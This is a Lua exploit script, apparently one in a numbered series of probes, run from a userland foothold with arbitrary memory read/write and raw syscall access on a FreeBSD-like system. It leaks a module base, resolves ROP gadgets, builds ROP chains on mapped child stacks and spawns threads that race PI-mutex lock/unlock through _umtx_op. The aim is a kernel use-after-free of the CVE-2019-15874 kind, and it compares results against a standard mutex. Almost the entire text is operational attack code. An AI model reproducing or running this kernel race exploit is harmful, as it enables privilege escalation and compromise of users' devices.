-- CRASH_CLASS: HIGH
-- PROBE 95b: PI-mutex race — no survey, straight to the race
--
-- CVE-2019-15874 class: umtx_pi UAF during contested PI-mutex
-- lock/unlock. 8 children loop LOCK→UNLOCK on same PI mutex,
-- racing the umtx_pi hash-table lookup vs free.
--
-- Survey results from 95a (ops 0-22):
--   Functional: 2,3,4,5,9,10,11,12,13,15,16,17,18,20,21
--   Dead: 0,1,6(no lock),7,8,14(no lock),22
--   Blocking: 19,23,24

print("=== PROBE 95b: PI-MUTEX RACE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430); local c624=mk(624)
local sc_umtx=mk(454)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
print("gadgets OK")

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

local MAX_CH=50
local STK_PG=2
local PG_PER_CHILD=STK_PG+1
local TOTAL_PG=2+MAX_CH*PG_PER_CHILD
print(string.format("ch=%d pg=%d", MAX_CH, TOTAL_PG))

local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(TOTAL_PG*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
print(string.format("region=0x%X",R))

local ts=R; wq(ts,uint64(999)); wq(ts+8,uint64(0))
local sl2=R+0x20; wq(sl2,uint64(0)); wq(sl2+8,uint64(2000000))
local sl5=R+0x40; wq(sl5,uint64(0)); wq(sl5+8,uint64(5000000))
local sl50=R+0x80; wq(sl50,uint64(0)); wq(sl50+8,uint64(50000000))
local tb=R+0xA0

-- PI mutex: struct umutex
-- +0x00: m_owner (4B), +0x04: m_flags (4B)
local pi_mtx=R+0x200
-- Standard mutex for comparison
local std_mtx=R+0x220

-- ============================================================
-- A: GATE — verify PI-mutex lock/unlock from main thread
-- ============================================================
print("--- A: PI-MUTEX GATE ---")

z(pi_mtx, 0x20)
wd(pi_mtx, 0)       -- m_owner = UMUTEX_UNOWNED
wd(pi_mtx+4, 4)     -- m_flags = UMUTEX_PRIO_INHERIT

local v0=vmc()
local ok_lk,rv_lk=pcall(function()
    return sc_umtx(uint64(pi_mtx),uint64(5),uint64(0),uint64(0),uint64(0))
end)
local v1=vmc()
local owner=rd(pi_mtx) or 0
print(string.format("PI LOCK: rv=%s owner=0x%X vmd=%d",
    ok_lk and tostring(N(rv_lk)) or "FAIL", owner, v1-v0))

local ok_ul,rv_ul=pcall(function()
    return sc_umtx(uint64(pi_mtx),uint64(6),uint64(0),uint64(0),uint64(0))
end)
local v2=vmc()
local owner2=rd(pi_mtx) or 0
print(string.format("PI UNLOCK: rv=%s owner=0x%X vmd=%d",
    ok_ul and tostring(N(rv_ul)) or "FAIL", owner2, v2-v1))

if not ok_lk or N(rv_lk)~=0 then
    print("PI MUTEX NOT FUNCTIONAL — abort")
    return
end
print("gate OK")

-- ============================================================
-- B: PI-MUTEX RACE — 8 children loop LOCK→UNLOCK
-- ============================================================
print("")
print("--- B: PI-MUTEX RACE ---")

local cidx=0
local function child_stk(i) return R+0x4000*(2+i*PG_PER_CHILD) end
local function child_ctx(i) return R+0x4000*(2+i*PG_PER_CHILD+STK_PG) end

local function spawn_locker(mtx_addr)
    if cidx>=MAX_CH then return nil end
    local si=cidx; cidx=cidx+1
    local stk=child_stk(si)
    local ctx=child_ctx(si)
    local stk_bytes=STK_PG*0x4000

    -- ROP: LOCK(5)→UNLOCK(6) loop on _umtx_op(454)
    -- Initial context does first LOCK (RSI=5, RAX=454)
    -- Chain alternates: PRSI→6,PRAX→454,SA, PRSI→5,PRAX→454,SA
    local off=0
    local ncycles=math.floor((stk_bytes-200)/80)
    for i=1,ncycles do
        wq(stk+off,PRSI); off=off+8
        wq(stk+off,uint64(6)); off=off+8     -- UNLOCK
        wq(stk+off,PRAX); off=off+8
        wq(stk+off,uint64(454)); off=off+8
        wq(stk+off,SA); off=off+8
        wq(stk+off,PRSI); off=off+8
        wq(stk+off,uint64(5)); off=off+8     -- LOCK
        wq(stk+off,PRAX); off=off+8
        wq(stk+off,uint64(454)); off=off+8
        wq(stk+off,SA); off=off+8
    end
    -- Final unlock to leave mutex clean
    wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(6)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(454)); off=off+8
    wq(stk+off,SA); off=off+8
    -- nanosleep(999s) tail
    wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts)); off=off+8
    wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8

    z(ctx, 0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(stk))
    wq(ctx+_AX,uint64(454))       -- _umtx_op
    wq(ctx+_DI,uint64(mtx_addr))  -- obj = &umutex
    wq(ctx+_SI,uint64(5))         -- op = MUTEX_LOCK
    wq(ctx+_DX,uint64(0))         -- val = 0
    wq(ctx+_R10,uint64(0))        -- uaddr1 = NULL
    wq(ctx+_R8,uint64(0))         -- uaddr2 = NULL

    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return rq(tb)
end

local hits_b=0
for round=1,5 do
    if cidx>=MAX_CH-8 then print("B: LIMIT at ch="..cidx) break end

    -- Fresh PI mutex each round
    z(pi_mtx, 0x20)
    wd(pi_mtx, 0)       -- unlocked
    wd(pi_mtx+4, 4)     -- PRIO_INHERIT

    local vm_before=vmc()
    print(string.format("B%d: spawning 8 children...", round))

    for i=1,8 do spawn_locker(pi_mtx) end

    -- Wait for children to run lock/unlock cycles
    native.fcall_with_rax(stub,240,sl50,0)  -- 50ms

    local vm_after=vmc()
    local m_owner=rd(pi_mtx) or 0
    local c=N(native.fcall_with_rax(stub,20))

    local tag=""
    if c~=pid then hits_b=hits_b+1; tag=" !!CANARY" end
    if m_owner~=0 then
        tag=tag..string.format(" STUCK=0x%X", m_owner)
        -- Force-clear stuck mutex
        wd(pi_mtx, 0)
        pcall(function()
            sc_umtx(uint64(pi_mtx),uint64(18),uint64(0),uint64(0),uint64(0))
        end)
    end

    print(string.format("B%d: canary=%d vmd=%d owner=0x%X ch=%d%s",
        round, c, vm_after-vm_before, m_owner, cidx, tag))
end
print("B: hits="..hits_b)

-- ============================================================
-- C: STANDARD MUTEX RACE (comparison — no PI)
-- ============================================================
print("")
print("--- C: STD MUTEX RACE ---")

local hits_c=0
for round=1,2 do
    if cidx>=MAX_CH-8 then print("C: LIMIT") break end

    z(std_mtx, 0x20)
    wd(std_mtx, 0)       -- unlocked
    wd(std_mtx+4, 0)     -- no PI

    local vm_before=vmc()
    for i=1,8 do spawn_locker(std_mtx) end
    native.fcall_with_rax(stub,240,sl50,0)

    local vm_after=vmc()
    local m_owner=rd(std_mtx) or 0
    local c=N(native.fcall_with_rax(stub,20))

    local tag=""
    if c~=pid then hits_c=hits_c+1; tag=" !!CANARY" end
    if m_owner~=0 then
        tag=tag..string.format(" STUCK=0x%X", m_owner)
        wd(std_mtx, 0)
        pcall(function()
            sc_umtx(uint64(std_mtx),uint64(18),uint64(0),uint64(0),uint64(0))
        end)
    end

    print(string.format("C%d: canary=%d vmd=%d owner=0x%X ch=%d%s",
        round, c, vm_after-vm_before, m_owner, cidx, tag))
end
print("C: hits="..hits_c)

-- ============================================================
print("")
print(string.format("SUMMARY: B=%d C=%d ch=%d", hits_b, hits_c, cidx))
print("final canary="..N(native.fcall_with_rax(stub,20)))
print("=== 95b COMPLETE ===")
